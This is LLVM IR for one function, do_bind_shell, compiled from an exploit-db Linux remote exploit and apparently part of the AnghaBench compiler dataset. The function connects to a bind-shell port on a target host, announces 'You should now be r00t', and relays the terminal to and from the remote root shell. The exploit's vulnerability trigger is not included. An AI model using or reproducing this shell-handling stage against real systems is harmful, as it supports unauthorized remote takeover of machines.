; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23161.c_do_bind_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23161.c_do_bind_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BINDSHELL_PORT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"[-] Success!!! You should now be r00t on %s\0A\00", align 1
@host = common dso_local global i8* null, align 8
@buf = common dso_local global i8* null, align 8
@SIZ = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @do_bind_shell() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = load i32, i32* @BINDSHELL_PORT, align 4
  %7 = call i32 @connect_to_host(i32 %6)
  store i32 %7, i32* %3, align 4
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %10

9:                                                ; preds = %0
  store i32 -1, i32* %1, align 4
  br label %67

10:                                               ; preds = %0
  %11 = load i8*, i8** @host, align 8
  %12 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i8* %11)
  br label %13

13:                                               ; preds = %62, %10
  %14 = call i32 @FD_ZERO(i32* %2)
  %15 = call i32 @FD_SET(i32 0, i32* %2)
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @FD_SET(i32 %16, i32* %2)
  %18 = load i32, i32* %3, align 4
  %19 = add nsw i32 %18, 1
  %20 = call i32 @select(i32 %19, i32* %2, i32* null, i32* null, i32* null)
  store i32 %20, i32* %4, align 4
  %21 = load i32, i32* %4, align 4
  %22 = icmp ne i32 %21, 0
  br i1 %22, label %23, label %55

23:                                               ; preds = %13
  %24 = load i32, i32* %3, align 4
  %25 = call i64 @FD_ISSET(i32 %24, i32* %2)
  %26 = icmp ne i64 %25, 0
  br i1 %26, label %27, label %38

27:                                               ; preds = %23
  %28 = load i8*, i8** @buf, align 8
  %29 = load i32, i32* %3, align 4
  %30 = load i8*, i8** @buf, align 8
  %31 = load i64, i64* @SIZ, align 8
  %32 = sub nsw i64 %31, 1
  %33 = call i32 @recv(i32 %29, i8* %30, i64 %32, i32 0)
  store i32 %33, i32* %5, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %28, i64 %34
  store i8 0, i8* %35, align 1
  %36 = load i8*, i8** @buf, align 8
  %37 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %36)
  br label %38

38:                                               ; preds = %27, %23
  %39 = call i64 @FD_ISSET(i32 0, i32* %2)
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %54

41:                                               ; preds = %38
  %42 = load i8*, i8** @buf, align 8
  %43 = load i8*, i8** @buf, align 8
  %44 = load i64, i64* @SIZ, align 8
  %45 = sub nsw i64 %44, 1
  %46 = call i32 @read(i32 0, i8* %43, i64 %45)
  store i32 %46, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %42, i64 %47
  store i8 0, i8* %48, align 1
  %49 = load i32, i32* %3, align 4
  %50 = load i8*, i8** @buf, align 8
  %51 = load i8*, i8** @buf, align 8
  %52 = call i32 @strlen(i8* %51)
  %53 = call i32 @send(i32 %49, i8* %50, i32 %52, i32 0)
  br label %54

54:                                               ; preds = %41, %38
  br label %55

55:                                               ; preds = %54, %13
  br label %56

56:                                               ; preds = %55
  %57 = load i32, i32* %4, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %62

59:                                               ; preds = %56
  %60 = load i32, i32* %5, align 4
  %61 = icmp ne i32 %60, 0
  br label %62

62:                                               ; preds = %59, %56
  %63 = phi i1 [ false, %56 ], [ %61, %59 ]
  br i1 %63, label %13, label %64

64:                                               ; preds = %62
  %65 = load i32, i32* %3, align 4
  %66 = call i32 @close(i32 %65)
  store i32 1, i32* %1, align 4
  br label %67

67:                                               ; preds = %64, %9
  %68 = load i32, i32* %1, align 4
  ret i32 %68
}

declare dso_local i32 @connect_to_host(i32) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i64, i32) #1

declare dso_local i32 @read(i32, i8*, i64) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
